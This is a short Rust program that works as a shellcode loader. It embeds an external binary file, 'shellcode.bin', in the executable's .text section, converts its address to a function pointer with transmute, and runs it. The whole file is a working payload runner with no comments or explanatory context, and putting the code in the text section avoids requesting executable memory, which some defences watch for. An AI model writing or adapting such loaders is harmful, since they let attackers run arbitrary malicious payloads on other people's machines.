use std::mem::transmute;

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

type ShellcodeFn = unsafe extern "C" fn() -> ();

fn main() {
    let shellcode_ptr = SHELLCODE.as_ptr() as *const ();
    let shellcode_fn: ShellcodeFn = unsafe { transmute(shellcode_ptr) };
    unsafe {
        shellcode_fn();
    }
}
